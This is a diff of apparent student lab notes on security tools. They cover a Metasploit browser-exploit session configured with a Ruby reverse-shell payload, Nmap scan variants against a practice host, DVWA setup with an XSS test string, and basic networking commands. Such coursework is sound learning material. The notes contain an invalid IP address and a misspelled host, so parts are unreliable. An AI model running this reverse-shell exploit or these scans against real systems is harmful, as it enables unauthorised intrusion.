@@ -1,10 +1,40 @@
-'d'
-Key.space
-'f'
-'g'
-'v'
-Key.backspace
-Key.backspace
-Key.backspace
-Key.backspace
-Key.backspace
+prac 10 : metasploit:------------
+msfconsole
+search tcp
+use exploit/multi/browser/msfd_rce_browser
+set srvport 1244
+show options
+set ssl true
+show options
+show payloads
+set payload ruby/shell_reverse_tcp
+show options
+ipconfig
+set lhost 192.168.90123
+show options
+exploit
+
+Port Scanning with NMap -------------
+nmap -sA -T4 scanme.nmap.org
+nmap -p22,113,139 scanme.nmap.org
+nmap -sF -T4 scanme.name.org
+nmap -sN -p 22 scanme.nmap.org
+nmap -sX -T4 scanme.nmap.org
+
+whois -----------
+https://whois.domaintools.com/flipkart.com
+-----------
+
+https://github.com/digininja/DVWA
+http://localhost/dvwa/setup.php
+Message: 
+<script>alert("This is XSS Exploit test")</script> “sign the Guestbook” by submitting the form. 
+http://testphp.vulnweb.com/login.php
+--------------------
+ifconfig                    ipconfig
+ping google.com             ping
+netstat                     netstat          
+traceroute google.com       tracert www.google.com
+
+-----------------------------------------
+https://drive.google.com/drive/folders/1aW81UjvblWUAb0zHpMAFiu23FhCedigM
